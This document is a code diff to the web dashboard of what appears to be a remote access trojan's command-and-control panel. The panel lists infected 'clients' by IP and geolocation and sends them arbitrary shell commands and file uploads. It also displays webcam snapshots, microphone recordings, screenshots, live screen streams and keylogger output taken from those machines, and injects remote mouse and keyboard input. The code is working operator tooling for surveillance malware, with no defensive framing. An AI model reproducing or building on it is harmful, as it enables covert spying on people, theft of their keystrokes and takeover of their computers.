@@ -624,7 +624,7 @@
                 </div>
                 <div class="status-item">
                     <div class="status-icon clients">◆</div>
-                    <div class="status-text" id="client-count">{% if clients %}{{ clients|length }} Clients Connected{% else %}0 Clients Connected{% endif %}</div>
+                    <div class="status-text" id="client-count">0 Clients Connected</div>
                 </div>
                 <div class="status-item">
                     <div class="status-icon time">◉</div>
@@ -643,13 +643,19 @@
                     <div class="clients-list" id="clients-list">
                         {% if clients %}
                             {% for client in clients %}
-                                <div class="client-item" data-client-id="{{ client }}">
+                                <div class="client-item" data-client-id="{{ client.id }}">
                                     <div class="client-header">
-                                        <span class="client-ip">{{ client }}</span>
-                                        <span class="client-status">Online</span>
+                                        <span class="client-ip">
+                                            {{ client.system.network.ip_addresses[0] if client.system.network and client.system.network.ip_addresses else 'Unknown' }}
+                                        </span>
+                                        <span class="client-status {{ 'active' if client.activity.status == 'active' else 'idle' }}">
+                                            {{ client.activity.status.capitalize() }}
+                                        </span>
                                     </div>
                                     <div class="client-details">
-                                        IP: Unknown | Location: Unknown
+                                        IP: {{ client.system.network.ip_addresses|join(', ') if client.system.network and client.system.network.ip_addresses else 'Unknown' }} | 
+                                        Location: {{ client.system.network.location.city if client.system.network and client.system.network.location and client.system.network.location.city else 'Unknown' }}, 
+                                        {{ client.system.network.location.country if client.system.network and client.system.network.location and client.system.network.location.country else 'Unknown' }}
                                     </div>
                                 </div>
                             {% endfor %}
@@ -694,7 +700,9 @@
                             <select id="client-select" class="form-select">
                                 <option value="">Select a client</option>
                                 {% for client in clients %}
-                                    <option value="{{ client }}">{{ client }}</option>
+                                    <option value="{{ client.id }}">
+                                        {{ client.id }} ({{ client.system.network.ip_addresses[0] if client.system.network and client.system.network.ip_addresses else 'Unknown' }})
+                                    </option>
                                 {% endfor %}
                             </select>
                             <input type="text" id="command-input" class="form-input" placeholder="Enter command (e.g., dir, whoami, download path/to/file)">
@@ -809,352 +817,354 @@
         </div>
     </div>
 
-    <!-- [Previous content remains unchanged until the script section] -->
+    <script>
+        const socket = io('/', { transports: ['websocket', 'polling'] });  // Explicitly connect to default namespace
+        let selectedClient = null;
+        let systemChart, networkChart;
+        const systemData = { cpu: [], memory: [], labels: [] };
+        const networkData = { sent: [], received: [], labels: [] };
+        const maxDataPoints = 20;
 
-  <script>
-      const socket = io();
-      let selectedClient = null;
-      let systemChart, networkChart;
-      const systemData = { cpu: [], memory: [], labels: [] };
-      const networkData = { sent: [], received: [], labels: [] };
-      const maxDataPoints = 20;
+        function updateTime() {
+            const now = new Date();
+            document.getElementById('current-time').textContent = now.toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
+        }
+        setInterval(updateTime, 1000);
+        updateTime();
 
-      function updateTime() {
-          const now = new Date();
-          document.getElementById('current-time').textContent = now.toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-      }
-      setInterval(updateTime, 1000);
-      updateTime();
+        function initializeCharts() {
+            const systemCtx = document.getElementById('system-chart').getContext('2d');
+            systemChart = new Chart(systemCtx, {
+                type: 'line',
+                data: {
+                    labels: systemData.labels,
+                    datasets: [
+                        { label: 'CPU Usage (%)', data: systemData.cpu, borderColor: '#0284c7', fill: false },
+                        { label: 'Memory Usage (MB)', data: systemData.memory, borderColor: '#7c3aed', fill: false }
+                    ]
+                },
+                options: {
+                    scales: { 
+                        x: { title: { display: true, text: 'Time', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } },
+                        y: { title: { display: true, text: 'Usage', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } } 
+                    },
+                    plugins: { legend: { labels: { color: '#b3c4d8' } } },
+                    responsive: true,
+                    maintainAspectRatio: false
+                }
+            });
 
-      function initializeCharts() {
-          const systemCtx = document.getElementById('system-chart').getContext('2d');
-          systemChart = new Chart(systemCtx, {
-              type: 'line',
-              data: {
-                  labels: systemData.labels,
-                  datasets: [
-                      { label: 'CPU Usage (%)', data: systemData.cpu, borderColor: '#0284c7', fill: false },
-                      { label: 'Memory Usage (MB)', data: systemData.memory, borderColor: '#7c3aed', fill: false }
-                  ]
-              },
-              options: {
-                  scales: { x: { title: { display: true, text: 'Time', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } },
-                          y: { title: { display: true, text: 'Usage', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } } },
-                  plugins: { legend: { labels: { color: '#b3c4d8' } } },
-                  responsive: true,
-                  maintainAspectRatio: false
-              }
-          });
+            const networkCtx = document.getElementById('network-chart').getContext('2d');
+            networkChart = new Chart(networkCtx, {
+                type: 'line',
+                data: {
+                    labels: networkData.labels,
+                    datasets: [
+                        { label: 'Sent (Mbps)', data: networkData.sent, borderColor: '#16a34a', fill: false },
+                        { label: 'Received (Mbps)', data: networkData.received, borderColor: '#ea580c', fill: false }
+                    ]
+                },
+                options: {
+                    scales: { 
+                        x: { title: { display: true, text: 'Time', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } },
+                        y: { title: { display: true, text: 'Speed (Mbps)', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } } 
+                    },
+                    plugins: { legend: { labels: { color: '#b3c4d8' } } },
+                    responsive: true,
+                    maintainAspectRatio: false
+                }
+            });
+        }
 
-          const networkCtx = document.getElementById('network-chart').getContext('2d');
-          networkChart = new Chart(networkCtx, {
-              type: 'line',
-              data: {
-                  labels: networkData.labels,
-                  datasets: [
-                      { label: 'Sent (Mbps)', data: networkData.sent, borderColor: '#16a34a', fill: false },
-                      { label: 'Received (Mbps)', data: networkData.received, borderColor: '#ea580c', fill: false }
-                  ]
-              },
-              options: {
-                  scales: { x: { title: { display: true, text: 'Time', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } },
-                          y: { title: { display: true, text: 'Speed (Mbps)', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } } },
-                  plugins: { legend: { labels: { color: '#b3c4d8' } } },
-                  responsive: true,
-                  maintainAspectRatio: false
-              }
-          });
-      }
+        function updateClientList(clients) {
+            const clientList = document.getElementById('clients-list');
+            const clientSelect = document.getElementById('client-select');
+            clientList.innerHTML = '';
+            clientSelect.innerHTML = '<option value="">Select a client</option>';
 
-      function updateClientList(clients) {
-          const clientList = document.getElementById('clients-list');
-          const clientSelect = document.getElementById('client-select');
-          clientList.innerHTML = '';
-          clientSelect.innerHTML = '<option value="">Select a client</option>';
+            if (clients.length === 0) {
+                clientList.innerHTML = '<div class="empty-state">No clients connected</div>';
+                document.getElementById('client-count').textContent = '0 Clients Connected';
+                selectedClient = null;
+                return;
+            }
 
-          if (clients.length === 0) {
-              clientList.innerHTML = '<div class="empty-state">No clients connected</div>';
-              document.getElementById('client-count').textContent = '0 Clients Connected';
-              selectedClient = null;
-              return;
-          }
+            document.getElementById('client-count').textContent = `${clients.length} Client${clients.length !== 1 ? 's' : ''} Connected`;
 
-          document.getElementById('client-count').textContent = `${clients.length} Client${clients.length !== 1 ? 's' : ''} Connected`;
+            clients.forEach(client => {
+                const clientItem = document.createElement('div');
+                clientItem.className = `client-item ${selectedClient === client.id ? 'selected' : ''}`;
+                clientItem.dataset.clientId = client.id;
 
-          clients.forEach(client => {
-              const clientItem = document.createElement('div');
-              clientItem.className = `client-item ${selectedClient === client.id ? 'selected' : ''}`;
-              clientItem.dataset.clientId = client.id;
+                const statusClass = client.activity.status === 'active' ? 'active' : 'idle';
+                const system = client.system || {};
+                const network = system.network || {};
+                const ipAddresses = network.ip_addresses || ['Unknown'];
+                const location = network.location || 'Unknown';
+                const city = typeof location === 'object' ? (location.city || 'Unknown') : 'Unknown';
+                const country = typeof location === 'object' ? (location.country || 'Unknown') : 'Unknown';
 
-              const statusClass = client.activity.status === 'active' ? 'active' : 'idle';
-              const system = client.system || {};
-              const network = system.network || {};
-              const ipAddresses = network.ip_addresses || ['Unknown'];
-              const location = network.location || {};
-              const city = location.city || 'Unknown';
-              const country = location.country || 'Unknown';
+                clientItem.innerHTML = `
+                    <div class="client-header">
+                        <span class="client-ip">${ipAddresses[0]}</span>
+                        <span class="client-status ${statusClass}">${client.activity.status.charAt(0).toUpperCase() + client.activity.status.slice(1)}</span>
+                    </div>
+                    <div class="client-details">
+                        IP: ${ipAddresses.join(', ')} | Location: ${city}, ${country}
+                    </div>
+                `;
 
-              clientItem.innerHTML = `
-                  <div class="client-header">
-                      <span class="client-ip">${ipAddresses[0]}</span>
-                      <span class="client-status ${statusClass}">${client.activity.status.charAt(0).toUpperCase() + client.activity.status.slice(1)}</span>
-                  </div>
-                  <div class="client-details">
-                      IP: ${ipAddresses.join(', ')} | Location: ${city}, ${country}
-                  </div>
-              `;
+                clientItem.addEventListener('click', () => {
+                    document.querySelectorAll('.client-item').forEach(item => item.classList.remove('selected'));
+                    clientItem.classList.add('selected');
+                    selectedClient = client.id;
+                    document.getElementById('client-select').value = client.id;
+                });
 
-              clientItem.addEventListener('click', () => {
-                  document.querySelectorAll('.client-item').forEach(item => item.classList.remove('selected'));
-                  clientItem.classList.add('selected');
-                  selectedClient = client.id;
-                  document.getElementById('client-select').value = client.id;
-              });
+                clientList.appendChild(clientItem);
 
-              clientList.appendChild(clientItem);
+                const option = document.createElement('option');
+                option.value = client.id;
+                option.textContent = `${client.id} (${ipAddresses[0]})`;
+                if (selectedClient === client.id) {
+                    option.selected = true;
+                }
+                clientSelect.appendChild(option);
+            });
+        }
 
-              const option = document.createElement('option');
-              option.value = client.id;
-              option.textContent = `${client.id} (${ipAddresses[0]})`;
-              if (selectedClient === client.id) {
-                  option.selected = true;
-              }
-              clientSelect.appendChild(option);
-          });
-      }
+        function appendOutput(data) {
+            const outputContainer = document.getElementById('output-container');
+            const entry = `[${data.timestamp}] Client ${data.client_id} (${data.command}): ${data.output}\nCurrent Dir: ${data.current_dir}\n\n`;
+            outputContainer.textContent += entry;
+            outputContainer.scrollTop = outputContainer.scrollHeight;
 
-      function appendOutput(data) {
-          const outputContainer = document.getElementById('output-container');
-          const entry = `[${data.timestamp}] Client ${data.client_id} (${data.command}): ${data.output}\nCurrent Dir: ${data.current_dir}\n\n`;
-          outputContainer.textContent += entry;
-          outputContainer.scrollTop = outputContainer.scrollHeight;
+            if (data.output.includes('sudo is blocked')) {
+                document.getElementById('sudo-warning').style.display = 'block';
+            }
+        }
 
-          if (data.output.includes('sudo is blocked')) {
-              document.getElementById('sudo-warning').style.display = 'block';
-          }
-      }
+        function updateSystemGraph(data) {
+            const time = new Date(data.timestamp * 1000).toLocaleTimeString();
+            systemData.labels.push(time);
+            systemData.cpu.push(data.cpu_usage_percent);
+            systemData.memory.push(data.memory_usage_mb);
 
-      function updateSystemGraph(data) {
-          const time = new Date(data.timestamp * 1000).toLocaleTimeString();
-          systemData.labels.push(time);
-          systemData.cpu.push(data.cpu_usage_percent);
-          systemData.memory.push(data.memory_usage_mb);
+            if (systemData.labels.length > maxDataPoints) {
+                systemData.labels.shift();
+                systemData.cpu.shift();
+                systemData.memory.shift();
+            }
 
-          if (systemData.labels.length > maxDataPoints) {
-              systemData.labels.shift();
-              systemData.cpu.shift();
-              systemData.memory.shift();
-          }
+            systemChart.update();
+        }
 
-          systemChart.update();
-      }
+        function updateNetworkGraph(data) {
+            const time = new Date(data.timestamp * 1000).toLocaleTimeString();
+            networkData.labels.push(time);
+            networkData.sent.push(data.sent_speed_mbps);
+            networkData.received.push(data.recv_speed_mbps);
 
-      function updateNetworkGraph(data) {
-          const time = new Date(data.timestamp * 1000).toLocaleTimeString();
-          networkData.labels.push(time);
-          networkData.sent.push(data.sent_speed_mbps);
-          networkData.received.push(data.recv_speed_mbps);
+            if (networkData.labels.length > maxDataPoints) {
+                networkData.labels.shift();
+                networkData.sent.shift();
+                networkData.received.shift();
+            }
 
-          if (networkData.labels.length > maxDataPoints) {
-              networkData.labels.shift();
-              networkData.sent.shift();
-              networkData.received.shift();
-          }
+            networkChart.update();
+        }
 
-          networkChart.update();
-      }
+        function updateMedia(data) {
+            console.log(`Received ${data.type} for client ${data.client_id}`); // Debug log
+            if (data.client_id !== selectedClient) return; // Only update for selected client
+            if (data.image) {
+                if (data.type === "webcam_data") {
+                    document.getElementById('webcam-image').src = `data:image/jpeg;base64,${data.image}`;
+                    document.getElementById('webcam-preview').style.display = 'block';
+                } else if (data.type === "screenshot_data") {
+                    document.getElementById('screenshot-image').src = `data:image/png;base64,${data.image}`;
+                    document.getElementById('screenshot-preview').style.display = 'block';
+                } else if (data.type === "screen_stream") {
+                    document.getElementById('remote-screen').src = `data:image/jpeg;base64,${data.image}`;
+                }
+            }
+            if (data.audio) {
+                const audio = document.getElementById('mic-audio');
+                audio.src = `data:audio/wav;base64,${data.audio}`;
+                audio.style.display = 'block';
+                document.getElementById('mic-preview').style.display = 'block';
+            }
+        }
 
-      function updateMedia(data) {
-          console.log(`Received ${data.type} for client ${data.client_id}`); // Debug log
-          if (data.client_id !== selectedClient) return; // Only update for selected client
-          if (data.image) {
-              if (data.type === "webcam_data") {
-                  document.getElementById('webcam-image').src = `data:image/jpeg;base64,${data.image}`;
-                  document.getElementById('webcam-preview').style.display = 'block';
-              } else if (data.type === "screenshot_data") {
-                  document.getElementById('screenshot-image').src = `data:image/png;base64,${data.image}`;
-                  document.getElementById('screenshot-preview').style.display = 'block';
-              } else if (data.type === "screen_stream") {
-                  document.getElementById('remote-screen').src = `data:image/jpeg;base64,${data.image}`;
-              }
-          }
-          if (data.audio) {
-              const audio = document.getElementById('mic-audio');
-              audio.src = `data:audio/wav;base64,${data.audio}`;
-              audio.style.display = 'block';
-              document.getElementById('mic-preview').style.display = 'block';
-          }
-      }
+        function updateKeylogs(data) {
+            const keylogContainer = document.getElementById('keylog-container');
+            keylogContainer.textContent = data.logs || 'No keylogs available';
+            keylogContainer.scrollTop = keylogContainer.scrollHeight;
+        }
 
-      function updateKeylogs(data) {
-          const keylogContainer = document.getElementById('keylog-container');
-          keylogContainer.textContent = data.logs || 'No keylogs available';
-          keylogContainer.scrollTop = keylogContainer.scrollHeight;
-      }
+        function setupRemoteDesktopControls() {
+            const screen = document.getElementById('remote-screen');
+            let isDragging = false;
 
-      function setupRemoteDesktopControls() {
-          const screen = document.getElementById('remote-screen');
-          let isDragging = false;
+            screen.addEventListener('mousedown', (e) => {
+                if (!selectedClient) return;
+                isDragging = true;
+                const rect = screen.getBoundingClientRect();
+                const x = ((e.clientX - rect.left) / rect.width) * 1280;
+                const y = ((e.clientY - rect.top) / rect.height) * 720;
+                const button = e.button === 0 ? 'left' : 'right';
+                socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'mouse_click', x, y, button, pressed: true }) });
+            });
 
-          screen.addEventListener('mousedown', (e) => {
-              if (!selectedClient) return;
-              isDragging = true;
-              const rect = screen.getBoundingClientRect();
-              const x = ((e.clientX - rect.left) / rect.width) * 1280;
-              const y = ((e.clientY - rect.top) / rect.height) * 720;
-              const button = e.button === 0 ? 'left' : 'right';
-              socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'mouse_click', x, y, button, pressed: true }) });
-          });
+            screen.addEventListener('mouseup', (e) => {
+                if (!selectedClient) return;
+                isDragging = false;
+                const rect = screen.getBoundingClientRect();
+                const x = ((e.clientX - rect.left) / rect.width) * 1280;
+                const y = ((e.clientY - rect.top) / rect.height) * 720;
+                const button = e.button === 0 ? 'left' : 'right';
+                socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'mouse_click', x, y, button, pressed: false }) });
+            });
 
-          screen.addEventListener('mouseup', (e) => {
-              if (!selectedClient) return;
-              isDragging = false;
-              const rect = screen.getBoundingClientRect();
-              const x = ((e.clientX - rect.left) / rect.width) * 1280;
-              const y = ((e.clientY - rect.top) / rect.height) * 720;
-              const button = e.button === 0 ? 'left' : 'right';
-              socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'mouse_click', x, y, button, pressed: false }) });
-          });
+            screen.addEventListener('mousemove', (e) => {
+                if (!selectedClient) return;
+                const rect = screen.getBoundingClientRect();
+                const x = ((e.clientX - rect.left) / rect.width) * 1280;
+                const y = ((e.clientY - rect.top) / rect.height) * 720;
+                socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'mouse_move', x, y }) });
+            });
 
-          screen.addEventListener('mousemove', (e) => {
-              if (!selectedClient) return;
-              const rect = screen.getBoundingClientRect();
-              const x = ((e.clientX - rect.left) / rect.width) * 1280;
-              const y = ((e.clientY - rect.top) / rect.height) * 720;
-              socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'mouse_move', x, y }) });
-          });
+            document.addEventListener('keydown', (e) => {
+                if (!selectedClient) return;
+                const key = e.key === ' ' ? 'space' : e.key.length > 1 ? `Key.${e.key.toLowerCase()}` : e.key;
+                socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'key_press', key, pressed: true }) });
+            });
 
-          document.addEventListener('keydown', (e) => {
-              if (!selectedClient) return;
-              const key = e.key === ' ' ? 'space' : e.key.length > 1 ? `Key.${e.key.toLowerCase()}` : e.key;
-              socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'key_press', key, pressed: true }) });
-          });
+            document.addEventListener('keyup', (e) => {
+                if (!selectedClient) return;
+                const key = e.key === ' ' ? 'space' : e.key.length > 1 ? `Key.${e.key.toLowerCase()}` : e.key;
+                socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'key_press', key, pressed: false }) });
+            });
 
-          document.addEventListener('keyup', (e) => {
-              if (!selectedClient) return;
-              const key = e.key === ' ' ? 'space' : e.key.length > 1 ? `Key.${e.key.toLowerCase()}` : e.key;
-              socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'key_press', key, pressed: false }) });
-          });
+            document.getElementById('start-stream-btn').addEventListener('click', () => {
+                if (selectedClient) {
+                    socket.emit('command', { to: selectedClient, command: 'start_stream' });
+                }
+            });
 
-          document.getElementById('start-stream-btn').addEventListener('click', () => {
-              if (selectedClient) {
-                  socket.emit('command', 'start_stream', { to: selectedClient });
-              }
-          });
+            document.getElementById('stop-stream-btn').addEventListener('click', () => {
+                if (selectedClient) {
+                    socket.emit('command', { to: selectedClient, command: 'stop_stream' });
+                }
+            });
+        }
 
-          document.getElementById('stop-stream-btn').addEventListener('click', () => {
-              if (selectedClient) {
-                  socket.emit('command', 'stop_stream', { to: selectedClient });
-              }
-          });
-      }
+        document.getElementById('send-btn').addEventListener('click', () => {
+            const clientId = document.getElementById('client-select').value;
+            const command = document.getElementById('command-input').value.trim();
+            if (clientId && command) {
+                fetch('/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams({ client_id: clientId, command })
+                }).then(response => response.json()).then(data => {
+                    if (data.status === 'success') {
+                        document.getElementById('command-input').value = '';
+                    }
+                });
+            }
+        });
 
-      document.getElementById('send-btn').addEventListener('click', () => {
-          const clientId = document.getElementById('client-select').value;
-          const command = document.getElementById('command-input').value.trim();
-          if (clientId && command) {
-              fetch('/send_command', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                  body: new URLSearchParams({ client_id: clientId, command })
-              }).then(response => response.json()).then(data => {
-                  if (data.status === 'success') {
-                      document.getElementById('command-input').value = '';
-                  }
-              });
-          }
-      });
+        document.getElementById('upload-btn').addEventListener('click', () => {
+            const fileInput = document.getElementById('file-upload');
+            if (fileInput.files.length > 0) {
+                const formData = new FormData();
+                formData.append('file', fileInput.files[0]);
+                fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                }).then(response => response.json()).then(data => {
+                    if (data.status === 'success') {
+                        fileInput.value = '';
+                    }
+                });
+            }
+        });
 
-      document.getElementById('upload-btn').addEventListener('click', () => {
-          const fileInput = document.getElementById('file-upload');
-          if (fileInput.files.length > 0) {
-              const formData = new FormData();
-              formData.append('file', fileInput.files[0]);
-              fetch('/upload', {
-                  method: 'POST',
-                  body: formData
-              }).then(response => response.json()).then(data => {
-                  if (data.status === 'success') {
-                      fileInput.value = '';
-                  }
-              });
-          }
-      });
+        document.querySelectorAll('.quick-action-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const clientId = document.getElementById('client-select').value;
+                const command = btn.dataset.command;
+                if (clientId && command) {
+                    fetch('/send_command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: new URLSearchParams({ client_id: clientId, command })
+                    });
+                }
+            });
+        });
 
-      document.querySelectorAll('.quick-action-btn').forEach(btn => {
-          btn.addEventListener('click', () => {
-              const clientId = document.getElementById('client-select').value;
-              const command = btn.dataset.command;
-              if (clientId && command) {
-                  fetch('/send_command', {
-                      method: 'POST',
-                      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                      body: new URLSearchParams({ client_id: clientId, command })
-                  });
-              }
-          });
-      });
+        document.getElementById('client-select').addEventListener('change', (e) => {
+            selectedClient = e.target.value;
+            document.querySelectorAll('.client-item').forEach(item => {
+                item.classList.toggle('selected', item.dataset.clientId === selectedClient);
+            });
+        });
 
-      document.getElementById('client-select').addEventListener('change', (e) => {
-          selectedClient = e.target.value;
-          document.querySelectorAll('.client-item').forEach(item => {
-              item.classList.toggle('selected', item.dataset.clientId === selectedClient);
-          });
-      });
+        socket.on('connect', () => {
+            console.log('Socket.IO connected to default namespace');
+            socket.emit('request_client_info');
+            initializeCharts();
+            setupRemoteDesktopControls();
+        });
 
-      socket.on('client_update', (clients) => {
-          socket.emit('request_client_info');
-      });
+        socket.on('connect_error', (error) => {
+            console.error('Socket.IO connection error:', error);
+        });
 
-      socket.on('client_info', (clients) => {
-          updateClientList(clients);
-      });
+        socket.on('client_info', (clients) => {
+            console.log('Received client_info:', clients); // Debug log
+            updateClientList(clients);
+        });
 
-      socket.on('command_output', (data) => {
-          appendOutput(data);
-      });
+        socket.on('command_output', (data) => {
+            appendOutput(data);
+        });
 
-      socket.on('system_data', (data) => {
-          if (data.client_id === selectedClient) {
-              updateSystemGraph(data);
-          }
-      });
+        socket.on('system_data', (data) => {
+            if (data.client_id === selectedClient) {
+                updateSystemGraph(data);
+            }
+        });
 
-      socket.on('network_data', (data) => {
-          if (data.client_id === selectedClient) {
-              updateNetworkGraph(data);
-          }
-      });
+        socket.on('network_data', (data) => {
+            if (data.client_id === selectedClient) {
+                updateNetworkGraph(data);
+            }
+        });
 
-      socket.on('webcam_data', (data) => {
-          updateMedia(data);
-      });
+        socket.on('webcam_data', (data) => {
+            updateMedia(data);
+        });
 
-      socket.on('mic_data', (data) => {
-          updateMedia(data);
-      });
+        socket.on('mic_data', (data) => {
+            updateMedia(data);
+        });
 
-      socket.on('screenshot_data', (data) => {
-          updateMedia(data);
-      });
+        socket.on('screenshot_data', (data) => {
+            updateMedia(data);
+        });
 
-      socket.on('screen_stream', (data) => {
-          updateMedia(data);
-      });
+        socket.on('screen_stream', (data) => {
+            updateMedia(data);
+        });
 
-      socket.on('keylog_data', (data) => {
-          if (data.client_id === selectedClient) {
-              updateKeylogs(data);
-          }
-      });
-
-      socket.on('connect', () => {
-          socket.emit('request_client_info');
-          initializeCharts();
-          setupRemoteDesktopControls();
-      });
-
-  </script>
-  
+        socket.on('keylog_data', (data) => {
+            if (data.client_id === selectedClient) {
+                updateKeylogs(data);
+            }
+        });
+    </script>
 </body>
 </html>
